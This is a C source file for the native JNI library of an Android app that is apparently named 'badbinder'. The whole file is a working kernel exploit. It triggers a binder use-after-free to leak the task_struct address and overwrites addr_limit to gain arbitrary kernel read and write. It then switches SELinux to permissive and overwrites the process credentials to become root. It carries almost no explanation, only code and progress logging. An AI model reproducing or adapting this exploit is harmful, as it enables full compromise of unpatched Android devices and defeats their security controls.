
#define _GNU_SOURCE

#include <sched.h>
#include <jni.h>
#include <string.h>
#include <android/log.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <assert.h>
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/uio.h>

#define BINDER_THREAD_EXIT 0x40046208ul
static JavaVM *g_vm = NULL;
static jobject g_logger = NULL;
static jmethodID g_onLog = NULL;
static pid_t g_main_pid = 0;

int fd = 0, ret;
static int page_size = 0x1000;
unsigned long selinux_security = 0, selinux_enforcing = 0;
unsigned long cred = 0, task_struct = 0, kernel_leak = 0, kernel_base = 0;
unsigned long addr, condition = 0;
unsigned long j = 0, i = 0, k;
char buf[0x2000];
char *spinner;

#define IOVEC_N 20
#define ADDR_LIMIT_OFFSET 0xa18
#define PID_OFFSET 0x4e8
#define CRED_OFFSET 0x680

static void send_to_ui(const char *msg);

void android_log(const char *message) {
    __android_log_print(ANDROID_LOG_INFO, "ExploitApp", "%s", message);
    send_to_ui(message);
}

void android_log_hex(const char *label, unsigned long value) {
    char buffer[256];
    snprintf(buffer, sizeof(buffer), "%s: 0x%lx", label, value);
    __android_log_print(ANDROID_LOG_INFO, "ExploitApp", "%s", buffer);
    send_to_ui(buffer);
}

void hexprint(char *buffer, unsigned int bytes) {
    int dqwords = ((bytes + 0x10 - 1) & 0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i += 2) {
        if (i % 64 == 0) {
            android_log("\n");
        }
        char temp[256];
        snprintf(temp, sizeof(temp), "0x%04llx: 0x%016llx 0x%016llx",
                 (unsigned long long) (i * 0x8),
                 ((size_t *) buffer)[i], ((size_t *) buffer)[i + 1]);
        __android_log_print(ANDROID_LOG_INFO, "ExploitApp", "%s", temp);
    }
    android_log("-----------------------------------------------");
    return;
}

void leak_task_struct() {
    android_log("[*] Starting leak_task_struct...");

    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    ret = sched_setaffinity(0, sizeof(cpu_set), &cpu_set);
    assert(ret >= 0);

    int epfd;
    struct epoll_event event = {.events = EPOLLIN};

    fd = open("/dev/binder", O_RDONLY);
    char fd_msg[64];
    snprintf(fd_msg, sizeof(fd_msg), "[+] binder fd: %d", fd);
    android_log(fd_msg);

    epfd = epoll_create(1000);
    char epfd_msg[64];
    snprintf(epfd_msg, sizeof(epfd_msg), "[+] epfd: %d", epfd);
    android_log(epfd_msg);

    struct iovec iov_buffers[IOVEC_N] = {0};
    char read_buffer0[0x1000];
    memset(read_buffer0, 0x52, 0x1000);

    spinner = (char *) mmap((void *) 0x100000000, page_size, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (spinner == MAP_FAILED) {
        android_log("[!] mmap failed!");
        return;
    }
    if (((long) spinner & 0xffffffff) != 0) {
        android_log("[!] mmap returned wrong address!");
        return;
    }

    iov_buffers[0xa].iov_base = spinner;
    iov_buffers[0xa].iov_len = 0x1000;
    iov_buffers[0xb].iov_base = read_buffer0;
    iov_buffers[0xb].iov_len = 0x1000;

    int pipe_fd[2];
    ret = pipe(pipe_fd);
    assert(ret != -1);

    ret = fcntl(pipe_fd[1], F_SETPIPE_SZ, 0x1000);
    assert(ret == 0x1000);
    ret = fcntl(pipe_fd[0], F_SETPIPE_SZ, 0x1000);
    assert(ret == 0x1000);

    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
    android_log("[*] Allocation done.");

    if (!fork()) {
        android_log("\t[C] Long sleep to ensure accuracy...");
        sleep(1);

        android_log("\t[*] Triggering UAF");
        epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);

        android_log("\t[C] Removing useless data from pipe...");
        ret = read(pipe_fd[0], buf, 0x1000);
        assert(ret == 0x1000);
        android_log("\t[C] Child exits...");
        _exit(0);
    }

    android_log("[*] Freeing.");
    ioctl(fd, BINDER_THREAD_EXIT, NULL);

    ret = writev(pipe_fd[1], iov_buffers, IOVEC_N);
    char writev_msg[64];
    snprintf(writev_msg, sizeof(writev_msg), "[+] writev() returns: 0x%lx", ret);
    android_log(writev_msg);
    assert(ret == 0x2000);

    read(pipe_fd[0], buf, 0x1000);
    printf("[+] read() returns: 0x%lx\n", ret);

    task_struct = *(unsigned long *) (buf + 0xe8);
    android_log_hex("[+] task_struct found", task_struct);
}

void overwrite_addr_limit() {
    android_log("[*] Starting overwrite_addr_limit...");

    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    ret = sched_setaffinity(0, sizeof(cpu_set), &cpu_set);
    assert(ret >= 0);

    int epfd;
    struct epoll_event event = {.events = EPOLLIN};

    fd = open("/dev/binder", O_RDONLY);
    char fd_msg[64];
    snprintf(fd_msg, sizeof(fd_msg), "[+] binder fd: %d", fd);
    android_log(fd_msg);

    epfd = epoll_create(1000);
    char epfd_msg[64];
    snprintf(epfd_msg, sizeof(epfd_msg), "[+] epfd: %d", epfd);
    android_log(epfd_msg);

    struct iovec iov_buffers[IOVEC_N] = {0};
    char read_buffer0[0x1000];
    memset(read_buffer0, 0x52, 0x1000);

    iov_buffers[0xa].iov_base = spinner;
    iov_buffers[0xa].iov_len = 0x1;
    iov_buffers[0xb].iov_base = read_buffer0;
    iov_buffers[0xb].iov_len = 0x8 * 5;
    iov_buffers[0xc].iov_base = read_buffer0;
    iov_buffers[0xc].iov_len = 0x8;

    int socket[2];
    ret = socketpair(AF_UNIX, SOCK_STREAM, 0, socket);
    assert(ret >= 0);

    ret = write(socket[1], "A", 1);
    assert(ret == 1);

    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
    android_log("[*] Allocation done.");

    struct msghdr msg;
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = iov_buffers;
    msg.msg_iovlen = IOVEC_N;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;

    if (!fork()) {
        android_log("\t[C] Long sleep to ensure accuracy...");
        sleep(1);

        android_log("\t[*] Triggering UAF");
        epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);

        android_log("\t[C] Sending usefull data now...");
        long data1234[] = {1, 0x13371337, 0x28, task_struct + ADDR_LIMIT_OFFSET, 0x8};
        ret = write(socket[1], data1234, 0x28);
        assert(ret == 0x28);
        android_log("\t[C] Sending final overwrite value...");
        data1234[0] = data1234[1] = data1234[2] = data1234[3] = 0xfffffffffffffffe;
        ret = write(socket[1], data1234, 0x8);
        assert(ret == 0x8);
        android_log("\t[C] Child exits...");
        _exit(0);
    }

    android_log("[*] Freeing.");
    ioctl(fd, BINDER_THREAD_EXIT, NULL);

    ret = recvmsg(socket[0], &msg, MSG_WAITALL);
    char recvmsg_msg[64];
    snprintf(recvmsg_msg, sizeof(recvmsg_msg), "[+] recvmsg() returns: 0x%lx", ret);
    android_log(recvmsg_msg);
    assert(ret == 0x31);

    android_log("[!] addr_limit overwrite done.");
}

unsigned long arb_read(unsigned long addr) {
    int pipe_fd[2];
    ret = pipe(pipe_fd);
    assert(ret != -1);

    unsigned long data = 0;
    write(pipe_fd[1], (void *) &addr, 8);
    read(pipe_fd[0], &data, 8);

    return data;
}

void arb_write(unsigned long addr, unsigned long len, void *data) {
    int pipe_fd[2];
    ret = pipe(pipe_fd);
    assert(ret != -1);

    write(pipe_fd[1], data, len);
    read(pipe_fd[0], (void *) addr, len);
}

void verifying() {
    android_log("[*] Starting verification...");

    int pipe_fd[2];
    ret = pipe(pipe_fd);
    assert(ret != -1);

    write(pipe_fd[1], (void *) task_struct, 0x1000);
    read(pipe_fd[0], buf, 0x1000);

    assert(getpid() == *(int *) (buf + PID_OFFSET));
    android_log("[!] Arbitrary rw verified with PID :D");

    cred = *(unsigned long *) (buf + CRED_OFFSET);
    android_log_hex("[+] cred", cred);

    kernel_leak = *(unsigned long *) (buf + 0x70);
    android_log_hex("[+] kernel_leak", kernel_leak);

    kernel_base = kernel_leak - 0xffffffff8100bf10 + 0xffffffff80200000;
    android_log_hex("[+] kernel_base", kernel_base);
}

static void send_to_ui(const char *msg) {
    if (!g_vm || !g_logger || !g_onLog) {
        return;
    }

    // Don't go to the JVM from the child process after fork()
    if (g_main_pid != 0 && getpid() != g_main_pid) {
        return;
    }

    JNIEnv *env = NULL;
    jint res = (*g_vm)->GetEnv(g_vm, (void **) &env, JNI_VERSION_1_6);

    if (res == JNI_EDETACHED) {
        if ((*g_vm)->AttachCurrentThread(g_vm, &env, NULL) != JNI_OK) {
            return;
        }
    } else if (res != JNI_OK) {
        return;
    }

    jstring jmsg = (*env)->NewStringUTF(env, msg);
    if (jmsg == NULL) return;

    (*env)->CallVoidMethod(env, g_logger, g_onLog, jmsg);
    (*env)->DeleteLocalRef(env, jmsg);
}


jint JNI_OnLoad(JavaVM *vm, void *reserved) {
    g_vm = vm;
    g_main_pid = getpid();
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL
Java_ru_redbyte_badbinder_MainActivity_setNativeLogger(
        JNIEnv *env,
        jobject thiz,
        jobject logger
) {
    if (g_logger != NULL) {
        (*env)->DeleteGlobalRef(env, g_logger);
        g_logger = NULL;
    }

    g_logger = (*env)->NewGlobalRef(env, logger);

    jclass loggerClass = (*env)->GetObjectClass(env, logger);
    g_onLog = (*env)->GetMethodID(env, loggerClass, "onLog", "(Ljava/lang/String;)V");
}

JNIEXPORT jstring JNICALL
Java_ru_redbyte_badbinder_MainActivity_runNativeExploit(JNIEnv *env, jobject thiz) {
    if (getuid() == 0) {
        return (*env)->NewStringUTF(env, "Already root!");
    }

    android_log("[*] Starting exploit...");

    leak_task_struct();
    overwrite_addr_limit();
    verifying();

    selinux_enforcing = kernel_base + 0x149fe58;
    android_log_hex("[+] security_enforcing", selinux_enforcing);

    android_log("[*] Time for a little magic...");

    // Disable selinux enforcing...
    memset(buf, 0, 0x100);
    buf[4] = buf[0] = 1;
    arb_write(selinux_enforcing, 4, buf + 0x10);
    android_log("[+] Selinux changed: Permissive now.");

    // escalate to root :)
    memset(buf, 0, 0x100);
    unsigned long *ptr = (unsigned long *) (buf + 0x30);
    *ptr++ = 0x0000003FFFFFFFFF;
    *ptr++ = 0x0000003FFFFFFFFF;
    *ptr++ = 0x0000003FFFFFFFFF;
    arb_write(cred + 4, 0x4c, buf + 4);

    if (getuid() == 0) {
        android_log("[+] Root escalation successful!");
        return (*env)->NewStringUTF(env, "Exploit successful! Root acquired.");
    } else {
        android_log("[!] Root escalation failed!");
        return (*env)->NewStringUTF(env, "Exploit failed! Root not acquired.");
    }
}
